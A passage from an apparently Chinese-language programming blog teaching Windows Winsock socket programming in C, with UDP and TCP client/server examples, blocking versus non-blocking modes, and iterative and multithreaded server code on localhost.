WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="面向非连接的SOCKET编程"><a href="#面向非连接的SOCKET编程" class="headerlink" title="面向非连接的SOCKET编程"></a>面向非连接的SOCKET编程</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>面向非连接（UDP）的特点：</p>
<p>1.不需要在服务端和客户端之间进建立连接</p>
<p>2.不对收到的数据进行排序</p>
<p>3.对接收到的数据包不发送确认信息，发送端无法知道数据是否被正确接收，也不会重新发送数据</p>
<p>4.传送数据较TCP快，系统开销也少</p>
<h3 id="UDP连接流程"><a href="#UDP连接流程" class="headerlink" title="UDP连接流程"></a>UDP连接流程</h3><table>
<thead>
<tr>
<th>主机流程（UDP）</th>
<th>客户端流程</th>
</tr>
</thead>
<tbody><tr>
<td>1.建立流式套接字</td>
<td>1.建立流式套接字</td>
</tr>
<tr>
<td>2.套接字：与本地地址绑定</td>
<td></td>
</tr>
<tr>
<td>3.在套接字上读&#x2F;写数据</td>
<td>2.在套接字上读&#x2F;写数据</td>
</tr>
<tr>
<td>4.关闭套接字</td>
<td>3.关闭套接字</td>
</tr>
</tbody></table>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>, <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收数据</span></span><br><span class="line">    iResult = recvfrom(server_fd, buffer, BUFSIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recvfrom failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    sendto(server_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, addrlen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((client_fd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IP地址从字符串转换为网络地址</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;inet_pton failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到服务器</span></span><br><span class="line">    sendto(client_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收服务器发送的数据</span></span><br><span class="line">    iResult = recvfrom(client_fd, buffer, BUFSIZE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recvfrom failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(client_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="阻塞式模型"><a href="#阻塞式模型" class="headerlink" title="阻塞式模型"></a>阻塞式模型</h2><h3 id="阻塞式"><a href="#阻塞式" class="headerlink" title="阻塞式"></a>阻塞式</h3><p>什么是阻塞式？</p>
<p>1.在创建一个套接字后，默认都是阻塞式的Winsocket的IO函数比如：Send和Recv，必须等待函数完成相应的I&#x2F;O操作后，才能继续</p>
<p>什么是非阻塞式？</p>
<p>1.通过调用ioctlsocket(SOCKET s, long cmd, u_long *arpg)函数，改变该套接字的模式，<br>U_long nNoBlock &#x3D;1;<br>loctlsocket(s,FIONBIO,&amp;nNoBlock);</p>
<p>2.无论操作是否完成，非阻塞式函数都会立即返回。例如，在非阻塞模式下调用recv接收数据时，程序会直接读取网络缓冲区中的数据。无论是否读到数据，函数都会立即返回</p>
<h3 id="阻塞式迭代模式"><a href="#阻塞式迭代模式" class="headerlink" title="阻塞式迭代模式"></a>阻塞式迭代模式</h3><p>1.每次只服务一个连接，只有在服务完当前客户端连接之后，才会继续服务下一个客户端连接</p>
<h4 id="阻塞式迭代模式步骤"><a href="#阻塞式迭代模式步骤" class="headerlink" title="阻塞式迭代模式步骤"></a>阻塞式迭代模式步骤</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.先处理连接 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span></span><br><span class="line"><span class="comment">// 2.接收一个客户端连接并返回对应的连接的套接字</span></span><br><span class="line">SOCKET <span class="title function_">AcceptConnetion</span><span class="params">(SOCKET hSocket)</span></span><br><span class="line"><span class="comment">// 3.处理一个客户端的连接，实现接收和发送数据</span></span><br><span class="line">BOOL <span class="title function_">ClientConFun</span><span class="params">(SOCKET sd)</span></span><br><span class="line"><span class="comment">// 4.关闭一个连接</span></span><br><span class="line">BOOL <span class="title function_">CloseConnect</span><span class="params">(SOCKET sd)</span></span><br><span class="line"><span class="comment">// 5.服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><h5 id="服务端-2"><a href="#服务端-2" class="headerlink" title="服务端"></a>服务端</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 先处理连接 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, nBacklog) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 接收一个客户端连接并返回对应的连接的套接字</span></span><br><span class="line">SOCKET <span class="title function_">AcceptConnetion</span><span class="params">(SOCKET hSocket)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">    SOCKET new_socket = accept(hSocket, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">    <span class="keyword">if</span> (new_socket == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> new_socket;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 处理一个客户端的连接，实现接收和发送数据</span></span><br><span class="line">BOOL <span class="title function_">ClientConFun</span><span class="params">(SOCKET sd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收数据</span></span><br><span class="line">    iResult = recv(sd, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    send(sd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 关闭一个连接</span></span><br><span class="line">BOOL <span class="title function_">CloseConnect</span><span class="params">(SOCKET sd)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (closesocket(sd) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;closesocket&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span> &#123;</span><br><span class="line">    SOCKET server_fd = Bind_Listen(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_fd == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        SOCKET client_socket = AcceptConnetion(server_fd);</span><br><span class="line">        <span class="keyword">if</span> (client_socket != INVALID_SOCKET) &#123;</span><br><span class="line">            ClientConFun(client_socket);</span><br><span class="line">            CloseConnect(client_socket);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MyTepSerFun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="客户端-2"><a href="#客户端-2" class="headerlink" title="客户端"></a>客户端</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET client_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from client&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((client_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器地址</span></span><br><span class="line">    serv_addr.sin_family = AF_INET;</span><br><span class="line">    serv_addr.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将IP地址从字符串转换为网络地址</span></span><br><span class="line">    <span class="keyword">if</span> (inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;serv_addr.sin_addr) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;inet_pton failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    <span class="keyword">if</span> (connect(client_fd, (<span class="keyword">struct</span> sockaddr *)&amp;serv_addr, <span class="keyword">sizeof</span>(serv_addr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;connect failed&quot;</span>);</span><br><span class="line">        closesocket(client_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据到服务器</span></span><br><span class="line">    send(client_fd, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收服务器发送的数据</span></span><br><span class="line">    iResult = recv(client_fd, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closed\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    closesocket(client_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="阻塞式并发连接模式"><a href="#阻塞式并发连接模式" class="headerlink" title="阻塞式并发连接模式"></a>阻塞式并发连接模式</h3><p>1.通过多线程，可以同时服务多个连接，每一个线程处理一个客户端连接</p>
<p>和迭代模式基本相同，只是在于处理客户端连接上，需要用到多线程处理多线程来处理客户端连接，以给予服务端同时处理业务的能力。</p>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><p>主要是针对服务端的代码，所以这里只写服务端</p>
<h5 id="服务端-3"><a href="#服务端-3" class="headerlink" title="服务端"></a>服务端</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，处理客户端连接</span></span><br><span class="line"><span class="type">unsigned</span> __stdcall <span class="title function_">ClientThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    SOCKET client_socket = *(SOCKET *)arg;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收数据</span></span><br><span class="line">    iResult = recv(client_socket, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    send(client_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    closesocket(client_socket);</span><br><span class="line">    <span class="built_in">free</span>(arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    